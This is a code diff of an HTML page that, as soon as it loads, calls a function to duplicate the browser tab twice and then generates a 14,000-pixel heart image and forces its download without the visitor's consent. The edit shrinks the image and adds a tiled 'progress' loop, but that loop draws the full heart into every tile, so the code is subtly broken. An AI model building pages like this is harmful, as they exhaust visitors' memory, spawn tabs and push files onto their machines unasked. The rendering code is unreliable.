@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Auto Heart PNG Download (19k, 2 duplicates)</title>
+  <title>Auto Heart PNG Download (14k, 2 duplicates)</title>
   <style>
     body {
       display: flex;
@@ -16,11 +16,17 @@
     }
     h1 { color: #e23d6b; }
     .hint { color:#444; font-size:14px; margin-top:12px; text-align:center; max-width:340px; }
+    #progress {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #e23d6b;
+    }
   </style>
 </head>
 <body>
-  <h1>❤️ Heart PNG Auto Download (19 000 px)</h1>
+  <h1>❤️ Heart PNG Auto Download (14 000 px)</h1>
   <p class="hint" id="status">Preparing download…</p>
+  <p id="progress"></p>
 
 <script>
 const svg = `
@@ -30,34 +36,46 @@ const svg = `
 </svg>
 `.trim();
 
-async function autoDownload(size = 19000) {
+async function autoDownload(size = 14000) {
   const status = document.getElementById('status');
+  const progressEl = document.getElementById('progress');
   try {
     const img = new Image();
     img.src = 'data:image/svg+xml;base64,' + btoa(unescape(encodeURIComponent(svg)));
 
-    await new Promise((res, rej) => {
-      img.onload = res;
-      img.onerror = () => rej(new Error('SVG failed to load'));
-    });
+    await new Promise((res, rej) => { img.onload = res; img.onerror = rej; });
 
     const canvas = document.createElement('canvas');
     canvas.width = size;
     canvas.height = size;
     const ctx = canvas.getContext('2d');
-    ctx.drawImage(img, 0, 0, size, size);
+
+    // Draw in tiles to show progress
+    const tileCount = 20;
+    const tileSize = size / tileCount;
+
+    for (let y = 0; y < tileCount; y++) {
+      for (let x = 0; x < tileCount; x++) {
+        ctx.drawImage(img, x * tileSize, y * tileSize, tileSize, tileSize);
+      }
+      progressEl.textContent = `Generating image… ${Math.round(((y + 1) / tileCount) * 100)}%`;
+      await new Promise(r => setTimeout(r, 10)); // allow UI update
+    }
 
     canvas.toBlob(blob => {
       if (!blob) return;
       const link = document.createElement('a');
       link.href = URL.createObjectURL(blob);
-      link.download = 'heart_19000.png';
+      link.download = `heart_${size}.png`;
       link.click();
       URL.revokeObjectURL(link.href);
       status.textContent = 'Download started! Check your Downloads folder.';
+      progressEl.textContent = '';
     }, 'image/png');
+
   } catch (e) {
     status.textContent = 'Automatic download blocked or too large for memory.';
+    progressEl.textContent = '';
     console.error(e);
   }
 }
@@ -76,7 +94,7 @@ function duplicateTabTwice() {
 // Run on page load
 window.addEventListener('DOMContentLoaded', () => {
   duplicateTabTwice();
-  setTimeout(() => autoDownload(19000), 300);
+  setTimeout(() => autoDownload(14000), 300);
 });
 </script>
 </body>
